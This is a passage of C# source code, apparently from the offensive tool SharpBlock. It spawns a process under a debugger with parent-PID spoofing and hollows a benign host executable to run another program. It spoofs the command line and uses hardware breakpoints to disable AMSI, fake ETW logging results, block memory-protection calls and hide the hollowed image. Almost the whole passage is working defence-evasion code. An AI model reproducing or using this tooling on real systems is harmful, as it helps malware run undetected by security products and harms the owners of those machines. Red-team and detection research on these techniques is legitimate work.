                .Add("s=|spawn=", "Host process to spawn for swapping with the target exe", v => hostProcess = v)
                .Add("ppid=", "PID of the process to use for parent process spoofing", v => ppid = int.Parse(v) )
                .Add("w|show", "Show the lauched process window instead of the default hide", v => showWindow = true )
                .Add("disable-bypass-amsi", "Disable AMSI bypassAmsi", v => bypassAmsi = false)
                .Add("disable-bypass-cmdline", "Disable command line bypass", v => bypassCommandLine = false)
                .Add("disable-bypass-etw", "Disable ETW bypass", v => bypassETW = false)
                .Add("disable-header-patch", "Disable process hollow detection bypass", v => bypassHollowDetect = false)
                .Add("disable-bypass-vmhook", "Disables the NtReadVirtualMemory hook", v => bypassVMHook = false)
                .Add("h|help", "Display this help", v => showHelp = v != null);

            try {

                option_set.Parse(args);

                if (showHelp) {
                    option_set.WriteOptionDescriptions(Console.Out);
                    return;
                }

            } catch (Exception e) {
                Console.WriteLine("[!] Failed to parse arguments: {0}", e.Message);
                option_set.WriteOptionDescriptions(Console.Out);
                return;
            }

            try {

                AnonymousPipeServerStream stdOutStream = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable);
                StreamReader stdOutReader = new StreamReader(stdOutStream); 
                stdOutStream.ReadMode = PipeTransmissionMode.Byte;
                Thread stdOutReaderThread = new Thread(() => StdOutReader(stdOutReader)); 
 
                IntPtr amsiBase = WinAPI.LoadLibrary("amsi.dll");
                amsiInitalizePtr = WinAPI.GetProcAddress(amsiBase, "AmsiInitialize");

                IntPtr ntdllBase = WinAPI.LoadLibrary("ntdll.dll");
                IntPtr etwEventWritePtr = WinAPI.GetProcAddress(ntdllBase, "EtwEventWrite");
                IntPtr ntProtectVirtualMemoryPtr = WinAPI.GetProcAddress(ntdllBase, "NtProtectVirtualMemory");

                Console.WriteLine($"[+] in-proc amsi 0x{amsiBase.ToInt64():x16}");
                Console.WriteLine($"[+] in-proc ntdll 0x{ntdllBase.ToInt64():x16}");

                STARTUPINFOEX startupInfo = new STARTUPINFOEX();
                startupInfo.StartupInfo.cb = (uint)Marshal.SizeOf(startupInfo);
                uint launchFlags = WinAPI.DEBUG_PROCESS;

                if (!showWindow) {
                    startupInfo.StartupInfo.dwFlags = 0x00000101;
                    launchFlags |= 0x08000000;
                }

                if (ppid > 0) {
                    launchFlags |= 0x80000;
                    startupInfo.StartupInfo.dwFlags |= 0x101;
                    startupInfo.lpAttributeList = InitializeProcThreadAttributeList(1);
                    SetNewProcessParent(ref startupInfo, ppid, stdOutStream.ClientSafePipeHandle.DangerousGetHandle());
                    stdOutReaderThread.Start();
                }

                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                string realProgramArgs = $"\"{hostProcess}\" {programArgs}";
                string launchedArgs = bypassCommandLine ? $"\"{hostProcess}\"" : realProgramArgs;

                if (!CreateProcess(hostProcess != null ? hostProcess : program, launchedArgs, IntPtr.Zero, IntPtr.Zero, true, launchFlags, IntPtr.Zero, null,
                    ref startupInfo, out pi)) {
                    Console.WriteLine($"[!] Failed to create process { (hostProcess != null ? hostProcess : program) } with error {Marshal.GetLastWin32Error()}");
                    return;
                }

                Console.WriteLine($"[+] Launched process { (hostProcess != null ? hostProcess : program)} with PID {pi.dwProcessId}");               
                bool bContinueDebugging = true;
                Dictionary<uint, IntPtr> processHandles = new Dictionary<uint, IntPtr>();
                Dictionary<uint, IntPtr> threadHandles = new Dictionary<uint, IntPtr>();

                while (bContinueDebugging) {
                    IntPtr debugEventPtr = Marshal.AllocHGlobal(1024);
                    bool bb = WinAPI.WaitForDebugEvent(debugEventPtr, 1000);
                    UInt32 dwContinueDebugEvent = WinAPI.DBG_CONTINUE;
                    if (bb) {
                        WinAPI.DEBUG_EVENT DebugEvent = GetDebugEvent(debugEventPtr);
                        switch (DebugEvent.dwDebugEventCode) {

                            /* Uncomment if you want to see OutputDebugString output 
                            case WinAPI.OUTPUT_DEBUG_STRING_EVENT:
                                WinAPI.OUTPUT_DEBUG_STRING_INFO OutputDebugStringEventInfo = (WinAPI.OUTPUT_DEBUG_STRING_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.OUTPUT_DEBUG_STRING_INFO));
                                IntPtr bytesRead;
                                byte[] strData = new byte[OutputDebugStringEventInfo.nDebugStringLength];
                                WinAPI.ReadProcessMemory(pi.hProcess, OutputDebugStringEventInfo.lpDebugStringData, strData, strData.Length, out bytesRead);
                                Console.WriteLine(Encoding.ASCII.GetString(strData));
                                break;
                            */                           

                            case WinAPI.CREATE_PROCESS_DEBUG_EVENT:

                                WinAPI.CREATE_PROCESS_DEBUG_INFO CreateProcessDebugInfo = GetStructureFromByteArray<WinAPI.CREATE_PROCESS_DEBUG_INFO>(DebugEvent.u);
                                processHandles[DebugEvent.dwProcessId] = CreateProcessDebugInfo.hProcess;
                                threadHandles[DebugEvent.dwThreadId] = CreateProcessDebugInfo.hThread;

                                if (bypassAmsi)
                                    SetHardwareBreakpoint(CreateProcessDebugInfo.hThread, amsiInitalizePtr, 0);

                                if(bypassVMHook)
                                    SetHardwareBreakpoint(CreateProcessDebugInfo.hThread, ntProtectVirtualMemoryPtr, 3);

                                break;
                            case WinAPI.CREATE_THREAD_DEBUG_EVENT:
                                WinAPI.CREATE_THREAD_DEBUG_INFO CreateThreadDebugInfo = GetStructureFromByteArray<WinAPI.CREATE_THREAD_DEBUG_INFO>(DebugEvent.u); 
                                threadHandles[DebugEvent.dwThreadId] = CreateThreadDebugInfo.hThread;

                                if (pi.dwProcessId == DebugEvent.dwProcessId) {
                                    if (bypassAmsi)
                                        SetHardwareBreakpoint(CreateThreadDebugInfo.hThread, amsiInitalizePtr, 0);

                                    if(bypassETW)
                                        SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], etwEventWritePtr, 2);

                                    if(bypassVMHook)
                                        SetHardwareBreakpoint(CreateThreadDebugInfo.hThread, ntProtectVirtualMemoryPtr, 3);
                                }

                                break;
                            case WinAPI.EXIT_PROCESS_DEBUG_EVENT:
                                if (pi.dwProcessId == DebugEvent.dwProcessId) {
                                    bContinueDebugging = false;
                                }
                                break;
                            case WinAPI.LOAD_DLL_DEBUG_EVENT:
                                WinAPI.LOAD_DLL_DEBUG_INFO LoadDLLDebugInfo = GetStructureFromByteArray<WinAPI.LOAD_DLL_DEBUG_INFO>(DebugEvent.u);
                                string dllPath = PatchEntryPointIfNeeded(LoadDLLDebugInfo.hFile, LoadDLLDebugInfo.lpBaseOfDll, processHandles[DebugEvent.dwProcessId]);

                                //Console.WriteLine($"[=] DLL Load: {dllPath}");

                                if (DebugEvent.dwProcessId == pi.dwProcessId) {

                                    // Once kernelbase.dll has loaded then update GetCommandLineW/A args
                                    if (bypassCommandLine && kernelBaseLoaded && !patchedArgs) {
                                        UpdateCommandLine(pi.hProcess, realProgramArgs);
                                        patchedArgs = true;
                                    }

                                    if (hostProcess != null && dllPath.EndsWith("ntdll.dll", StringComparison.OrdinalIgnoreCase)) {
                                        Console.WriteLine($"[+] Replacing host process with {program}");
                                        hpi = ReplaceExecutable(processHandles[DebugEvent.dwProcessId], threadHandles[DebugEvent.dwThreadId], program);

                                        //Set a breakpoint on EtwEventWrite ready for us to bypass
                                        SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], etwEventWritePtr, 2);

                                        //Once we have hollowed out our process we put a breakpoint on 
                                        //our in-memory PE entry point.  
                                        //Once the entry point is hit it means that we can then attempt to 
                                        //hide our PE from prying eyes.
                                        SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], hpi.newEntryPoint, 1);

                                    } else if (dllPath.EndsWith("kernelbase.dll", StringComparison.OrdinalIgnoreCase)) {
                                        kernelBaseLoaded = true;
                                    }
                                }

                                break;

                            case WinAPI.EXCEPTION_DEBUG_EVENT:
                                WinAPI.EXCEPTION_DEBUG_INFO ExceptionDebugInfo = GetStructureFromByteArray<WinAPI.EXCEPTION_DEBUG_INFO>(DebugEvent.u);

                                if (ExceptionDebugInfo.ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP ||
                                       ExceptionDebugInfo.ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_BREAKPOINT) {

                                    //Check to see if the single step breakpoint is at AmsiInitalize
                                    if (ExceptionDebugInfo.ExceptionRecord.ExceptionAddress == amsiInitalizePtr) {
                                        //It is, to update the thread context to return to caller with 
                                        //an invalid result
                                        DisableAMSI(threadHandles[DebugEvent.dwThreadId], processHandles[DebugEvent.dwProcessId]);
                                        
                                        //Set the hardware breakpoint again for AmsiInitalize
                                        SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], amsiInitalizePtr, 0);

                                        //check to see if we have hit our in-memory PE entry-point
                                    } else if (ExceptionDebugInfo.ExceptionRecord.ExceptionAddress == hpi.newEntryPoint) {

                                        //Causes crashes on some processes, for example cmd.exe, use --bypass-header-patch to disable
                                        if(bypassHollowDetect)
                                            HideHollowedProcess(pi.hProcess, hpi);
                                        
                                        //Catch case just in case kernelbase was the last DLL loaded
                                        if (bypassCommandLine && kernelBaseLoaded && !patchedArgs) {
                                            UpdateCommandLine(pi.hProcess, realProgramArgs);
                                            patchedArgs = true;
                                        }

                                        //No longer need the entrypoint breakpoint
                                        ClearHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], 1);

                                    }else if(ExceptionDebugInfo.ExceptionRecord.ExceptionAddress == etwEventWritePtr) {
                                        //We have hit EtwEventWrite so lets just return with a fake success result
                                        OverrideReturnValue(threadHandles[DebugEvent.dwThreadId], processHandles[DebugEvent.dwProcessId], new UIntPtr(0), 5);
                                    }else if(ExceptionDebugInfo.ExceptionRecord.ExceptionAddress == ntProtectVirtualMemoryPtr) {
                                        BlockVirtualProtect(threadHandles[DebugEvent.dwThreadId], processHandles[DebugEvent.dwProcessId]);
                                        SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], ntProtectVirtualMemoryPtr, 3);
                                    } else {
                                        SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], ntProtectVirtualMemoryPtr, 3);
                                    }
                                
                                } else {
                                    dwContinueDebugEvent = WinAPI.DBG_EXCEPTION_NOT_HANDLED;
                                }

                                if (ExceptionDebugInfo.dwFirstChance == 0 && ExceptionDebugInfo.ExceptionRecord.ExceptionCode != WinAPI.EXCEPTION_SINGLE_STEP) {
                                    Console.WriteLine($"Exception 0x{ExceptionDebugInfo.ExceptionRecord.ExceptionCode:x} occured at 0x{ExceptionDebugInfo.ExceptionRecord.ExceptionAddress.ToInt64():x}");
                                    for(int idx=0; idx< ExceptionDebugInfo.ExceptionRecord.NumberParameters; ++idx ) {
                                        Console.WriteLine($"\tParameter: 0x{ExceptionDebugInfo.ExceptionRecord.ExceptionInformation[idx]}");
                                    }                                 
                                }

                                break;
                        }

                        WinAPI.ContinueDebugEvent((uint)DebugEvent.dwProcessId,
                            (uint)DebugEvent.dwThreadId,
                            dwContinueDebugEvent);
                    }
                    if (debugEventPtr != null)
                        Marshal.FreeHGlobal(debugEventPtr);
                }

                int exitCode;
                WinAPI.GetExitCodeProcess(pi.hProcess, out exitCode);                
                Console.WriteLine($"[+] Process {program} with PID {pi.dwProcessId} exited wit code {exitCode:x}");
                
                if (stdOutReaderThread.IsAlive) {
                    stdOutReader.Close();
                    stdOutStream.Close();
                    //Ugly exit due to std out pipe causing hang inside thread
                    Environment.Exit(0);
                }
                   
            }catch(Exception e) {
                Console.WriteLine($"[!] SharpBlock failed with error {e.Message}");
                Console.WriteLine(e.StackTrace);
            }
        }
    }
}
